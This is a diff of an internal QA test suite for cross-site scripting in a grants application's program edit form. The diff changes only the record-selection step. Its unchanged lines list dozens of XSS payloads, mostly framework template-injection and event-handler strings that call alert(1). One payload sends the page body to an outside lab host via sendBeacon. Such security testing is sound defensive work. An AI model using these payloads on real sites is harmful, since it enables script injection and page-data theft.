     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                          |
       | <a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a> | fieldBeneficiaryEligibility__c |
@@ -6475,7 +6475,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | {{$el.ownerDocument.defaultView.alert(1)}} | fieldBeneficiaryEligibility__c |
@@ -6500,7 +6500,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                          |
       | {{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}} | fieldBeneficiaryEligibility__c |
@@ -6525,7 +6525,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | <img src @error=e=$event.path.pop().alert(1)> | fieldBeneficiaryEligibility__c |
@@ -6550,7 +6550,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                          |
       | <img src @error=e=$event.composedPath().pop().alert(1)> | fieldBeneficiaryEligibility__c |
@@ -6575,7 +6575,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                          |
       | <img src @error=this.alert(1)> | fieldBeneficiaryEligibility__c |
@@ -6600,7 +6600,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                          |
       | <svg@load=this.alert(1)> | fieldBeneficiaryEligibility__c |
@@ -6625,7 +6625,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> | fieldBeneficiaryEligibility__c |
@@ -6650,7 +6650,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                          |
       | {{_openBlock.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -6675,7 +6675,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | {{_createBlock.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -6700,7 +6700,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                          |
       | {{_toDisplayString.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -6725,7 +6725,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | {{_createVNode.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -6750,7 +6750,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                          |
       | <p v-show=_createBlock.constructor`alert(1)`()> | fieldBeneficiaryEligibility__c |
@@ -6775,7 +6775,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | <x @[_openBlock.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6800,7 +6800,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | <x @[_capitalize.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6825,7 +6825,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <x @click=_withCtx.constructor`alert(1)`()>click</x> | fieldBeneficiaryEligibility__c |
@@ -6850,7 +6850,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                          |
       | <x @click=$event.view.alert(1)>click</x> | fieldBeneficiaryEligibility__c |
@@ -6875,7 +6875,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                          |
       | {{_Vue.h.constructor`alert(1)`()}} | fieldBeneficiaryEligibility__c |
@@ -6900,7 +6900,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | {{$emit.constructor`alert(1)`()}} | fieldBeneficiaryEligibility__c |
@@ -6925,7 +6925,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                 | Field                          |
       | <teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script> | fieldBeneficiaryEligibility__c |
@@ -6950,7 +6950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                          |
       | <component is=script text=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -6975,7 +6975,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | {{constructor.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -7000,7 +7000,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | {{$on.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -7025,7 +7025,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                      | Field                          |
       | {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -7050,7 +7050,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                          |
       | {{{}.")));alert(1)//"}} | fieldBeneficiaryEligibility__c |
@@ -7075,7 +7075,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                          |
       | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -7100,7 +7100,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                        | Field                          |
       | {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}} | fieldBeneficiaryEligibility__c |
@@ -7125,7 +7125,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                          |
       | {{{}.")));alert(1)//"}} | fieldBeneficiaryEligibility__c |
@@ -7154,7 +7154,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value           | Field                  |
       | Assistance Type | fieldAssistanceType__c |
@@ -7180,7 +7180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                  |
       | <xss onafterscriptexecute=alert(1)><script>1</script> | fieldAssistanceType__c |
@@ -7205,7 +7205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                           | Field                  |
       | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldAssistanceType__c |
@@ -7230,7 +7230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                       | Field                  |
       | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldAssistanceType__c |
@@ -7255,7 +7255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                            | Field                  |
       | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
@@ -7280,7 +7280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                            | Field                  |
       | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
@@ -7305,7 +7305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                  |
       | <body onbeforeprint=console.log(1)> | fieldAssistanceType__c |
@@ -7330,7 +7330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                  |
       | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldAssistanceType__c |
@@ -7355,7 +7355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                     | Field                  |
       | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
@@ -7380,7 +7380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                  |
       | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldAssistanceType__c |
@@ -7405,7 +7405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldAssistanceType__c |
@@ -7430,7 +7430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                            | Field                  |
       | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7455,7 +7455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                   | Field                  |
       | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldAssistanceType__c |
@@ -7480,7 +7480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                         | Field                  |
       | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAssistanceType__c |
@@ -7505,7 +7505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldAssistanceType__c |
@@ -7530,7 +7530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                  |
       | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7555,7 +7555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                  |
       | <audio src/onerror=alert(1)> | fieldAssistanceType__c |
@@ -7580,7 +7580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAssistanceType__c |
@@ -7605,7 +7605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAssistanceType__c |
@@ -7630,7 +7630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                  |
       | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldAssistanceType__c |
@@ -7655,7 +7655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldAssistanceType__c |
@@ -7680,7 +7680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                         | Field                  |
       | <body onhashchange="print()"> | fieldAssistanceType__c |
@@ -7705,7 +7705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                  | Field                  |
       | <body onload=alert(1)> | fieldAssistanceType__c |
@@ -7730,7 +7730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7755,7 +7755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                  |
       | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7780,7 +7780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                  |
       | <body onmessage=print()> | fieldAssistanceType__c |
@@ -7805,7 +7805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                      | Field                  |
       | <body onpageshow=alert(1)> | fieldAssistanceType__c |
@@ -7830,7 +7830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                  | Field                  |
       | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7855,7 +7855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                     | Field                  |
       | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -7880,7 +7880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                  |
       | <body onpopstate=print()> | fieldAssistanceType__c |
@@ -7905,7 +7905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                   | Field                  |
       | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAssistanceType__c |
@@ -7930,7 +7930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                   | Field                  |
       | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldAssistanceType__c |
@@ -7955,7 +7955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                  |
       | <body onresize="print()"> | fieldAssistanceType__c |
@@ -7980,7 +7980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                   | Field                  |
       | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldAssistanceType__c |
@@ -8005,7 +8005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <marquee onstart=alert(1)>XSS</marquee> | fieldAssistanceType__c |
@@ -8030,7 +8030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -8055,7 +8055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                  |
       | <details ontoggle=alert(1) open>test</details> | fieldAssistanceType__c |
@@ -8080,7 +8080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                        | Field                  |
       | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldAssistanceType__c |
@@ -8105,7 +8105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                              | Field                  |
       | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldAssistanceType__c |
